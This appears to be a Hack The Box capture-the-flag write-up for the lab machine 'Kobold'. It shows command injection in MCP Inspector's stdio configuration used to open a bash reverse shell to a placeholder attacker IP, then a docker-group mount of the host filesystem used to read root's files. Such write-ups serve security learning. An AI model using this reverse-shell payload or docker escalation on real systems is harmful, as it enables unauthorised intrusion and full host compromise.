
# HTB Kobold Write-up

## 1. Initial Access
**Vulnerability:** Command Injection via Model Context Protocol (MCP) Configuration (**CVE-2026-23744**).

The application **MCP Inspector** was found to be vulnerable to command injection when adding a new MCP server using the `stdio` transport. The `command` and `args` fields in the JSON configuration were passed directly to a system shell without proper sanitization.

**Exploit Payload:**
```bash
curl -k -X POST "https://mcp.kobold.htb/api/mcp/connect" \
  -H "Content-Type: application/json" \
  -d '{
    "serverConfig": {
      "command": "/bin/bash",
      "args": ["-c", "bash -i >& /dev/tcp/[ATTACKER_IP]/4444 0>&1"],
      "env": {}
    },
    "serverId": "exploit"
  }'
```
Executing this payload granted a reverse shell as the user `ben`.

---

## 2. Enumeration
Upon gaining access, local enumeration was performed to identify privilege escalation vectors.

*   **User:** `ben`
*   **Groups:** `ben`, `operator`, `docker`

The user `ben` was found to be a member of the **docker** group. This allows for arbitrary container management, which can be leveraged to interact with the host filesystem as `root`.

---

## 3. Privilege Escalation
Since the user can run Docker commands, the host's root filesystem (`/`) was mounted into a temporary container. By accessing the mount point inside the container, it is possible to read any file on the host system.

**Exploitation Command:**
```bash
newgrp docker
docker run -v /:/hostfs --rm --user root --entrypoint cat privatebin/nginx-fpm-alpine:2.0.2 /hostfs/root/root.txt

```

**Results:**
*   **User Flag:** `[REDACTED]`
*   **Root Flag:** `[REDACTED]`

---

## 4. Conclusion
The machine was compromised due to:
1.  **Insecure Command Execution:** Lack of input validation in the MCP server configuration.
2.  **Over-privileged User:** Assigning a standard user to the `docker` group, which is functionally equivalent to providing full `root` access.

---
